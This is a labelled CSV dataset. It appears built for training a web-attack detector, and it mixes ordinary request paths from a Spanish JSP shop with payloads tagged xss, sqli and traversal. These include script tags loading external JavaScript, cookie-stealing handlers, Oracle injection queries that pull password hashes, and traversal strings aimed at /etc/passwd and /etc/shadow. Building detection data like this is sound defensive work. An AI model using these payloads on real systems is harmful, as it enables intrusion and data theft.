payload,type
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=43&B1=A%F1adir+al+carrito,normal
imagenes/cmenbul.gif,normal
miembros/imagenes/castro.jpg,normal
publico/pagar.jsp?modo=insertar&precio=5093&B1=Confirmar,normal
imagenes/cmenbul.gif,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/carrito.jsp,normal
"<;SCRIPT a="";>';>""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
publico/pagar.jsp?modo=insertar&precio=1984&B1=Confirmar,normal
publico/miembros.jsp,normal
"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",xss
imagenes/nuestratierra.jpg,normal
"<;IMG LOWSRC="";javascript:alert(';XSS';);"";>;",xss
miembros/editar.jsp?modo=registro&login=gaulle&password=Puls%CDMEtrO&nombre=Porfidio&apellidos=Peguera&email=shail%40arrsys.mz&dni=72903426G&direccion=Calle+Cruz+De+Caravaca%2C+171%2C+&ciudad=Almaraz&cp=08520&provincia=Lleida&ntc=0669143201019058&B1=Registrar,normal
../../../../../{FILE},traversal
.../{FILE},traversal
global/titulo.jsp,normal
global/creditos.jsp,normal
"<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",xss
imagenes/cmenbul.gif,normal
global/creditos.jsp,normal
miembros/imagenes/ogono.jpg,normal
"<style>@import ""data:,*%7bx:expression(javascript:alert(1))%7D"";</style>",xss
"<a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a>",xss
"&lt;INPUT TYPE=\""IMAGE\"" SRC=\""javascript&#058;alert('XSS');\""&gt;",xss
miembros/imagenes/castro.jpg,normal
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foof>",xss
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},xss
"vc: select * from users where id=1 + @<1# union select 1,version() -- 1",sqli
./.././.././.././../{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:alert(1)</script>"">",xss
"sn{s: select * from users where id=1 or ""_{"" or 1=1 -- 1",sqli
index.jsp,normal
imagenes/1.gif,normal
miembros/salir.jsp,normal
imagenes/3.gif,normal
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=65&B1=A%F1adir+al+carrito,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"'';!--""<XSS>=&{()}",xss
global/estilos.css,normal
"<video><source onerror=""javascript:javascript:alert(1)"">",xss
publico/carrito.jsp,normal
<IMG SRC=javascript:alert('XSS')>       ,xss
..\..\..\..\..\{FILE},traversal
"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",sqli
miembros/imagenes/castro.jpg,normal
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",xss
global/menum.jsp,normal
miembros/imagenes/zarauz.jpg,normal
imagenes/3.gif,normal
&oo1&: select * from users where id=1 or \< =1 or 1=1 -- 1,sqli
"<XML ID=I><X><C><![<IMG SRC=""javas]]<![cript:document.vulnerable=true;"">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>",xss
global/creditos.jsp,normal
imagenes/3.gif,normal
global/titulo.jsp,normal
imagenes/logo.gif,normal
""" or isNULL(1/0) /*",sqli
%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
publico/productos.jsp,normal
miembros/imagenes/castro.jpg,normal
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
miembros/imagenes/ogono.jpg,normal
..\..\..\..\..\..\..\..\{FILE},traversal
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\{FILE},traversal
"'`""><\x00script>javascript:alert(1)</script>",xss
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal
"&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;XSS&lt;/A&gt;",xss
o1n&1: select * from users where id=1 <@1$ or 1=1 -- 1,sqli
imagenes/1.gif,normal
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
imagenes/cmenbul.gif,normal
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",xss
<IMG SRC=&{javascript:alert(1);};>,xss
<audio src=1 onerror=alert(1)>,xss
miembros/salir.jsp,normal
global/menum.jsp,normal
imagenes/cmenbul.gif,normal
global/menum.jsp,normal
imagenes/3.gif,normal
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
publico/caracteristicas.jsp?id=2,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",sqli
"<link REL=""stylesheet"" HREF=""javascript:document.vulnerable=true;"">",xss
1script3document.vulnerable=true;1/script3,xss
"s1n: select * from users where id=1 or ""1["" or 1=1 -- 1",sqli
"""`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>",xss
miembros/salir.jsp,normal
"&lt;BGSOUND SRC=\""javascript&#058;alert('XSS');\""&gt;",xss
%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE},traversal
imagenes/2.gif,normal
imagenes/3.gif,normal
miembros/index.jsp,normal
"'';!--""<XSS>=&{()}",xss
publico/carrito.jsp,normal
"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",xss
publico/caracteristicas.jsp?id=1,normal
publico/registro.jsp?modo=registro&login=clerc&password=DeSPacIo&nombre=Enio&apellidos=Elias+Pallares&email=mcisaac_burnham5%40lamarsrl.tv&dni=23997242P&direccion=Calle+Levi%2C+12+2-C&ciudad=Royo%2C+El&cp=29056&provincia=Zaragoza&ntc=1600011664845261&B1=Registrar,normal
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>,xss
miembros/fotos.jsp,normal
miembros/imagenes/ogono.jpg,normal
imagenes/cmenbul.gif,normal
global/menum.jsp,normal
%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
global/creditos.jsp,normal
index.jsp,normal
index.jsp,normal
miembros/imagenes/ogono.jpg,normal
publico/caracteristicas.jsp?id=1,normal
publico/productos.jsp,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=55&B1=A%F1adir+al+carrito,normal
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,traversal
"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",xss
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-,xss
miembros/imagenes/castro.jpg,normal
publico/pagar.jsp?modo=insertar&precio=5596&B1=Confirmar,normal
exec xp,sqli
index.jsp,normal
imagenes/cmenbul.gif,normal
miembros/editar.jsp?modo=registro&login=paley&password=conTRaRioSa&nombre=Romarico&apellidos=Mastache+Comapla&email=koleskidy%40manjarr.ps&dni=23291292C&direccion=Calle+Cantos+Negros+150+&ciudad=Piedras+Albas&cp=01719&provincia=Almer%EDa&ntc=3175397567040813&B1=Registrar,normal
miembros/imagenes/zarauz.jpg,normal
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,xss
miembros/imagenes/zarauz.jpg,normal
miembros/imagenes/ogono.jpg,normal
global/estilos.css,normal
"<img src=""x` `<script>javascript:alert(1)</script>""` `>",xss
<SCRIPT SRC=//ha.ckers.org/.j>,xss
miembros/fotos.jsp,normal
imagenes/1.gif,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/index.jsp,normal
miembros/index.jsp,normal
miembros/imagenes/ogono.jpg,normal
miembros/editar.jsp?modo=registro&login=hanzlice&password=ras4RojAR&nombre=Thayra&apellidos=Guardiola+Puertolas&email=bearse%40cdgranadabaila.lv&dni=32493489D&direccion=C%2F+Portal+De+Zamudio+65%2C+&ciudad=Sant+Andreu+Salou&cp=37120&provincia=C%E1ceres&ntc=5385467629611173&B1=Registrar,normal
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE},traversal
"'`""><\x3Cscript>javascript:alert(1)</script>",xss
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
publico/pagar.jsp?modo=insertar&precio=7219&B1=Pasar+por+caja,normal
"&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\""javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\""&gt;&#93;&#93;&gt;",xss
..........................................................................\..\..\..\..\{FILE},traversal
"<IMG SRC=x ontoggle=""alert(String.fromCharCode(88,83,83))"">",xss
miembros/imagenes/ogono.jpg,normal
..%uEFC8..%uEFC8{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
..../..../{FILE},traversal
"<>""'%;)(&+",sqli
"UE11f: select * from users where id=1 union select 1 $,version() -- 1",sqli
&lt;HTML&gt;&lt;BODY&gt;,xss
"<;SCRIPT a=`>;` SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
publico/caracteristicas.jsp?id=2,normal
perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out,xss
"<IMG SRC=""javascript:alert('XSS');"">",xss
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss
"<img src=""blah>"" onmouseover=""document.vulnerable=true;"">",xss
miembros/imagenes/ogono.jpg,normal
index.jsp,normal
"""><img src=x onerror=javascript:alert((""A""))>",xss
"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/index.jsp,normal
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/,xss
miembros/imagenes/castro.jpg,normal
publico/caracteristicas.jsp?id=1,normal
"sUEvk: select * from users where id='1'   union select null,banner from v$version where rownum=1 -- 1'",sqli
miembros/fotos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/index.jsp,normal
"so1&1: select * from users where id='1' + 1||1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
miembros/fotos.jsp,normal
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},traversal
"<embed width=500 height=500 code=""data:text/html,<script>%(payload)s</script>""></embed>",xss
<IMG SRC=javascript:alert(‘XSS’)>      ,xss
miembros/imagenes/ogono.jpg,normal
<;/br style=a:expression(alert())>;,xss
miembros/imagenes/zarauz.jpg,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/index.jsp,normal
&.on&: select * from users where id=1 or \.<$ or 1=1 -- 1,sqli
miembros/imagenes/castro.jpg,normal
"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",xss
"s:)s: select * from users where id=1 or "":)""=1 or 1=1 -- 1",sqli
"&lt;IMG SRC=\""   javascript&#058;alert('XSS');\""&gt;",xss
publico/pagar.jsp?modo=insertar&precio=8217&B1=Confirmar,normal
"<img DYNSRC=""javascript:document.vulnerable=true;"">",xss
.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\{FILE},traversal
"s?os: select * from users where id=1 or ""?%"" or 1=1 -- 1",sqli
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss
miembros/imagenes/zarauz.jpg,normal
miembros/imagenes/castro.jpg,normal
publico/miembros.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"""/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />",xss
imagenes/nuestratierra.jpg,normal
@var select @var as var into temp end --,sqli
"<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",xss
miembros/salir.jsp,normal
publico/productos.jsp,normal
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=39&B1=A%F1adir+al+carrito,normal
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=24&B1=A%F1adir+al+carrito,normal
miembros/index.jsp,normal
publico/caracteristicas.jsp?id=2,normal
"<XSS STYLE=""xss:expression(document.vulnerable=true)"">",xss
index.jsp,normal
miembros/salir.jsp,normal
miembros/imagenes/castro.jpg,normal
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
imagenes/1.gif,normal
publico/caracteristicas.jsp?id=2,normal
publico/autenticar.jsp?modo=entrar&login=lauze&pwd=retenIdAmEnte&remember=on&B1=Entrar,normal
miembros/imagenes/castro.jpg,normal
publico/miembros.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"sov1U: select * from users where id='1' + @ 1 union select 1,version() -- 1'",sqli
<img src=``&NewLine; onerror=alert(1)&NewLine;,xss
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
..%%35%63..%%35%63{FILE},traversal
publico/productos.jsp,normal
global/creditos.jsp,normal
index.jsp,normal
publico/autenticar.jsp?modo=entrar&login=pue-gilc&pwd=cOacu_9ado&remember=off&B1=Entrar,normal
"""`'><script>\x0Djavascript:alert(1)</script>",xss
publico/miembros.jsp,normal
<input onblur=javascript:alert(1) autofocus><input autofocus>,xss
"<meta HTTP-EQUIV=""Link"" Content=""<http://www.securitycompass.com/xss.css>; REL=stylesheet"">",xss
miembros/imagenes/castro.jpg,normal
"<A HREF=""http://1113982867/"">XSS</A>",xss
publico/registro.jsp?modo=registro&login=fergus&password=99oRTaDeRo&nombre=Carmi%F1a&apellidos=Gruart+Ola&email=woll%40stockdefotos.bb&dni=74799380E&direccion=Avda.+Somosaguas+150%2C+1%3FB&ciudad=Castil+de+Peones&cp=44561&provincia=Badajoz&ntc=3580665595349534&B1=Registrar,normal
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,xss
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=76&B1=A%F1adir+al+carrito,normal
imagenes/2.gif,normal
global/menum.jsp,normal
"`""'><img src=xxx:x onerror\x0C=javascript:alert(1)>",xss
publico/autenticar.jsp?modo=entrar&login=caryn&pwd=oliv_icultora&remember=on&B1=Entrar,normal
miembros/imagenes/castro.jpg,normal
<// style=x:expression\28javascript:alert(1)\29>,xss
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
miembros/imagenes/ogono.jpg,normal
index.jsp,normal
global/estilos.css,normal
"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),xss
index.jsp,normal
miembros/fotos.jsp,normal
' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,sqli
publico/carrito.jsp,normal
publico/registro.jsp?modo=registro&login=oxendine&password=INduRaci%F3N&nombre=Artenio&apellidos=Sabadell&email=dekeyser%40creacionwebs.bn&dni=46157420P&direccion=Jesus+Jimenez%2C+86%2C+&ciudad=Albeta&cp=09580&provincia=Le%F3n&ntc=7688901932687073&B1=Registrar,normal
miembros/imagenes/ogono.jpg,normal
global/estilos.css,normal
miembros/imagenes/zarauz.jpg,normal
imagenes/2.gif,normal
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE},traversal
miembros/salir.jsp,normal
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss
miembros/salir.jsp,normal
publico/caracteristicas.jsp?id=2,normal
global/menum.jsp,normal
imagenes/1.gif,normal
"""><s""%2b""cript>alert(document.cookie)</script>",xss
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",xss
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<IMG SRC=""javascript:javascript:alert(1)""",xss
..///..///..///{FILE},traversal
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",xss
<svg contentScriptType=text/vbs><script>MsgBox+1,xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},traversal
"s1ns: select * from users where id=1 or ""1_"" or 1=1 -- 1",sqli
global/menum.jsp,normal
<iframe src=http://ha.ckers.org/scriptlet.html <,xss
"<a href=""\xE2\x80\x86javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",xss
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},traversal
.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\..\{FILE},traversal
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
"&lt;STYLE&gt;li {list-style-image&#58; url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS",xss
"<img src=x\x11onerror=""javascript:alert(1)"">",xss
<div style=content:url(%(svg)s)></div>,xss
publico/caracteristicas.jsp?id=2,normal
"<IFRAME width=""420"" height=""315"" frameborder=""0"" onload=""alert(document.cookie)""></IFRAME>",xss
publico/carrito.jsp,normal
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
publico/registro.jsp?modo=registro&login=vadi&password=Calif%F3rnico&nombre=Jerusal%E9n&apellidos=Gering&email=dantas.pellegrim4%40nanotecnologo.kr&dni=73502486Y&direccion=Escuelas+148%2C+&ciudad=Villarejo+del+Valle&cp=05412&provincia=Zamora&ntc=2774742421964079&B1=Registrar,normal
"""`'><script>\x0Ajavascript:alert(1)</script>",xss
XSS STYLE=xss:e/**/xpression(alert('XSS'))>,xss
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",sqli
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
publico/registro.jsp?modo=registro&login=wacker&password=fac2or%EDa&nombre=Dannies&apellidos=Garc%EDa+Fong&email=bain%40raullazaro.pm&dni=12113019T&direccion=Calle+De+La+Coru%F1a+26+10%3FH&ciudad=Polopos&cp=10300&provincia=Valladolid&ntc=7953912981751706&B1=Registrar,normal
miembros/imagenes/castro.jpg,normal
global/menum.jsp,normal
publico/registro.jsp?modo=registro&login=chungen&password=6r_o733300e&nombre=Argentino&apellidos=Gallart+Coc%F3m&email=edmunds.emil%40carimartin.io&dni=80483953F&direccion=Glorieta+Antonio+Molina+87%2C+&ciudad=Sari%F1ena&cp=42223&provincia=Guadalajara&ntc=6206191254660151&B1=Registrar,normal
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<IMG SRC=""javascript:alert('XSS');"">",xss
"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
miembros/imagenes/ogono.jpg,normal
""" """,sqli
miembros/fotos.jsp,normal
publico/pagar.jsp?modo=insertar&precio=6246&B1=Confirmar,normal
..%255c..%255c..%255c..%255c..%255c{FILE},traversal
%2e%2e/%2e%2e/%2e%2e/{FILE},traversal
publico/caracteristicas.jsp?id=2,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/imagenes/zarauz.jpg,normal
"<META HTTP-EQUIV=""Link"" Content=""<%(css)s>; REL=stylesheet"">",xss
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",xss
imagenes/1.gif,normal
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},traversal
global/titulo.jsp,normal
"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",xss
"""><img src=x onerror=javascript:alert(""1"")>",xss
miembros/fotos.jsp,normal
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss
' or 1=1--,sqli
miembros/imagenes/ogono.jpg,normal
imagenes/1.gif,normal
"snUEf: select * from users where id=1 or 1#""$ union select version(),version() -- 1",sqli
"&lt;A HREF=\""http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\""&gt;XSS&lt;/A&gt;",xss
miembros/imagenes/zarauz.jpg,normal
miembros/salir.jsp,normal
global/titulo.jsp,normal
publico/registro.jsp?modo=registro&login=duljit&password=regi0ona2&nombre=Ros%E1ngela&apellidos=Sit%FA+Agulla&email=nissen%40hipersevilla.af&dni=07077546D&direccion=Passatge+Brancatges%2C+104+&ciudad=Granyena+de+Segarra&cp=12527&provincia=Salamanca&ntc=1026055264847672&B1=Registrar,normal
&#X03c;,xss
global/titulo.jsp,normal
\..\WINDOWS\win.ini,traversal
index.jsp,normal
global/estilos.css,normal
"1)UE1: select * from users where id=1 +(1) union select 1,banner from v$version where rownum=1 -- 1",sqli
global/menum.jsp,normal
miembros/imagenes/ogono.jpg,normal
"""`'><script>\xC2\xA0javascript:alert(1)</script>",xss
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
miembros/fotos.jsp,normal
"&lt;IMG SRC=\""jav&#x0A;ascript&#058;alert('XSS');\""&gt;",xss
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",xss
"<SCRIPT>document.write(""XSS"");</SCRIPT>",xss
imagenes/logo.gif,normal
<img src=``&NewLine; onerror=alert(1)&NewLine;,xss
imagenes/2.gif,normal
publico/carrito.jsp,normal
<iframe src=http://ha.ckers.org/scriptlet.html <,xss
miembros/fotos.jsp,normal
&#x00003c,xss
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},traversal
<script>alert('XSS');</script>,xss
miembros/imagenes/ogono.jpg,normal
%00/etc/shadow%00,traversal
"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",xss
miembros/editar.jsp?modo=registro&login=jaki&password=ara%F1erO&nombre=Estanislao&apellidos=Clara&email=mullen%40menorca.com.bf&dni=30591115B&direccion=Padre+Lojendio+53+11%3FC&ciudad=Duesaig%FCes&cp=40171&provincia=C%E1ceres&ntc=7693499164739124&B1=Registrar,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
..\..\\{FILE},traversal
imagenes/1.gif,normal
miembros/editar.jsp?modo=registro&login=sudip&password=a25E7E&nombre=Wady&apellidos=Sevilla+Subauste&email=stadlen%40asociaciondearquitectoslatinoamericanos.tc&dni=60586849L&direccion=Calle+Rocafort%2C+169+4C&ciudad=Cerralbo&cp=45569&provincia=Guadalajara&ntc=1918370923327655&B1=Registrar,normal
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",xss
global/menum.jsp,normal
miembros/fotos.jsp,normal
global/creditos.jsp,normal
